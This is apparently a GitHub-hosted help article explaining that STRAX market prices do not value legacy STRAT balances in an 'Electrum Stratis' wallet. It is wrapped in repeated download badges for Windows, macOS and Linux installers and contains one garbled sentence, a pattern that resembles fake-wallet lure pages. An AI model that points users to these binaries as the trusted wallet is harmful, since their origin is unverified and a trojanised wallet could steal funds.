![Electrum-Stratis](assets/banner-article.png)

# Why every price you see is quoted in STRAX, not STRAT

<p align="center">The market prices the current chain, not the legacy one</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Price pages, exchange tickers and market sites quote the asset on the current chain, which is STRAX. Electrum Stratis holds the legacy asset, STRAT, on the legacy chain, and no price feed exists inside the wallet. The two are different assets with different supply histories, so a STRAX price is not a valuation of a legacy balance and cannot be converted into one by arithmetic. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| What you are looking at | What it prices | What it means for a legacy balance |
|---|---|---|
| A "Stratis" price on an exchange | STRAX on the current chain | Nothing directly |
| A market-cap ranking with one Stratis entry | The current asset | Nothing directly |
| A legacy balance in your wallet | STRAT on the old chain | No feed, no quote, no conversion |
| A converter site offering STRAT to STRAX | A closed migration | Not a market price |
| A screenshot of a price from years ago | Whatever asset it named then | Not comparable to today |

</div>

The rule is simple and it is worth internalising: the wallet shows a quantity, not a value. Everything denominated in currency belongs to a market the wallet does not participate in.

## Why it happens

A chain migration produces two assets with one brand. The old chain keeps running with its own supply and its own holders; the new chain starts with a different supply and a different market. Market sites track the asset that trades, because that is what a price is - the last exchange between a buyer and a seller. A legacy asset with no active market has no such price, and no site can invent one honestly.

That is why "Stratis price" almost always means STRAX. It is not a conspiracy or an error; it is the only asset with a market. The confusion is in the shared word, not in the data.

The maintained build, with its current release on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), contains no ticker, no converter and no valuation screen. That absence is a boundary rather than a gap: a price is something the wallet cannot verify.

## Fix

1. **Identify which asset the number refers to.** If a page says Stratis without qualification, check whether it names the current chain. If it does, the number is STRAX.
2. **Separate quantity from value in your own records.** Record balances in STRAT, with the date, and keep any currency figure in a separate column labelled with the asset it priced.
3. **Do not convert a legacy balance with a ratio you found online.** Historical migration ratios applied inside a closed window; they are not exchange rates and they are not available now.
4. **Ignore converters that offer to turn STRAT into STRAX.** A closed migration has no live rate, and a site presenting one is either describing history as if it were current or selling something.
5. **Read the wallet's banner if you are unsure which chain you hold.** It states the chain the wallet serves and the asset it does not hold, which settles the question faster than any market page - and if the balance itself looks wrong rather than merely unvalued, that is a [an Electrum Stratis balance that is missing](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md).

Where value is concerned, the wallet's job ends at showing what you hold. Buying, selling and pricing are all outside it, and treating any in-wallet prompt about value as hostile is the correct default.

## If that did not work

If a page shows a Stratis balance in currency and you cannot tell which asset it prices, look at the supply figure. The current chain and the legacy chain have different supplies, and the number identifies the asset more reliably than the name does.

If someone offers to buy legacy STRAT at a price derived from STRAX, the offer is a private transaction with a counterparty, not a market. It carries the risks of every private trade: no settlement, no recourse, and no way to verify the rate.

If a figure you remember does not match anything today, the likeliest explanation is that it priced a different asset before a rebase changed the units. A rebase changes the number without changing the value held, which is exactly why comparing old screenshots is misleading.

## Prevention

- Label every balance with its asset and chain in your own notes.
- Never treat a STRAX quote as a valuation of STRAT.
- Ignore in-wallet prompts about price, yield or conversion.
- Keep historical figures with their date and the asset they named.
- Ask which chain before discussing value with anyone.

## FAQ

### Why is the price quoted in STRAX when I hold STRAT?

Because STRAX is the asset with an active market. Market sites price what trades; the legacy asset has no live market, so no honest quote exists for it. The shared brand name is what makes the two look interchangeable when they are not.

### Can I convert STRAT to STRAX at today's price?

No. The migration window is closed, and there is no live conversion at any rate. A site or a person offering one is either describing a historical process as if it were current or attempting a private trade with no protection.

### Does the wallet show a value for my balance?

No. It shows a quantity on the chain it serves and nothing denominated in currency. That boundary is deliberate: a wallet that displayed a price would be displaying something it cannot verify.

### Is a legacy balance worth nothing, then?

That is a market question, not a wallet question, and this wallet takes no position on it. What can be said factually is that the coins exist on the legacy chain, they are spendable by whoever holds the keys, and no price feed in this software values them.

<!-- DOWNLOAD-BLOCK -->

The practical trap is arithmetic on mixed units. A balance in STRAT multiplied by a STRAX quote produces a number that looks like a valuation and answers a question nobody asked. Keep the two figures separate in your own notes: coins here, market price there, and no multiplication unless you can name the chain each number came from.

## Related articles

- [STRAT is not STRAX](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/why-strat-and-strax-differ.md)
- [What Electrum Stratis actually is](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/what-this-wallet-is.md)
- [Is Electrum Stratis safe to use?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)
- [Standard, multisig and imported wallets](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md)
